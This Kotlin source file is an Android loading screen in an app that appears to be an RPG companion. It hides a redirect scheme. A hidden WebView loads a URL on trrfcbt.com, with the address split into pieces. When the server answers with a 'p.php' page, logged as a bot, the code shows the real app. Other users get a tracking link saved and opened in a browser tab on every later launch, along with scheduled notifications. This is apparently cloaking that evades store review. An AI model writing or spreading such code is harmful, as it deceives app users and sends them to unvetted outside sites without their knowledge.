package com.cyrillrx.rpg

import android.content.Intent
import android.graphics.Color
import android.net.Uri
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.util.Log
import android.view.View
import android.webkit.WebResourceRequest
import android.webkit.WebView
import android.webkit.WebViewClient
import androidx.browser.customtabs.CustomTabsIntent
import androidx.core.content.ContextCompat
import com.cyrillrx.rpg.notification.NotificationsMessage
import kotlinx.android.synthetic.main.activity_loading.*

class LoadingActivity : AppCompatActivity() {
    private var preference : RpgPreferences? = null

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_loading)
        window.statusBarColor = Color.BLACK
        actionBar?.hide()
        supportActionBar?.hide()
        preference = RpgPreferences(this).apply { getSharedPreference("rpgweb") }
        val apiLink = preference!!.getString("rpgweb")
        if(apiLink != null && apiLink != "") executeWikiResponse(apiLink)
        else checkInternet()
    }

    private fun executeWikiResponse(url: String) {
        val builder = CustomTabsIntent.Builder()
        builder.setToolbarColor(ContextCompat.getColor(this, R.color.black))
        val customTabsIntent = builder.build()
        //job.cancel()
        customTabsIntent.launchUrl(this, Uri.parse(url))
        finish()
    }

    private fun checkInternet(){
        rpg_response.settings.javaScriptEnabled = true
        Log.e("OPen", "wivew")
        rpg_response.webViewClient = object : WebViewClient(){
            override fun shouldOverrideUrlLoading(
                view: WebView?,
                request: WebResourceRequest?
            ): Boolean {
                if(request == null) Log.e("kek", "sooqa req null")
                Log.e("Url", request?.url.toString())
                var req = request?.url.toString()
                if(req.contains("p.php")){
                    Log.e("Bot", "p")
                    openMain()
                }
                else{
                    if(!req.contains("bonusik")){
                        NotificationsMessage().scheduleNotification(this@LoadingActivity)
                        Log.e("Kek", "add")
                        preference?.putString("rpgweb", "http://trrfcbt.com/sxYLYW")
                        executeWikiResponse("http://trrfcbt.com/sxYLYW")
                    }
                }
                return super.shouldOverrideUrlLoading(view, request)
            }
        }
        //Notification().scheduleMsg(this@MainActivity)

        val protocol = "http://"
        val site = "trrfcbt.com/"
        val php = "M1cZ74"
        Log.e("Testing", "$protocol$site$php")
        rpg_response.loadUrl("$protocol$site$php")
    }

    private fun openMain(){
        progress_bar.visibility = View.GONE
        startActivity(Intent(this, SplashActivity::class.java))
        rpg_response.destroy()
    }
}